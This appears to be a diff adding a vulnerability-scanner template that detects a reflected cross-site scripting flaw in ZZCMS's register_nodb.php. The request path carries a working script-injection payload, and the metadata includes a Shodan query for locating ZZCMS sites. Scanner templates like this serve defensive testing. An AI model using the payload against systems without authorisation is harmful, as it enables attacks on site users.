@@ -1,0 +1,36 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"><script>alert(document.domain)</script>'
+    - example=register
+  - part: content_type
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/3/ucenter_api/code/register_nodb.php/"><script>alert(document.domain)</script>'
+id: zzcms-register-xss
+info:
+  author: 3th1c_yuk1
+  description: 'Identified a reflected Cross-Site Scripting (XSS) vulnerability in
+    register_nodb.php of ZZCMS, which allowed injection of malicious scripts via user-supplied
+    input.
+
+    '
+  metadata:
+    max-request: 1
+    shodan-query: html:"zzcms"
+    verified: true
+  name: Zzcms `register_nodb.php` - Cross Site Scripting
+  reference:
+  - https://github.com/Sinon2003/cve/blob/main/zzcms/xss-register_nodb.php.md
+  severity: medium
+  tags: xss,zzcms,vuln
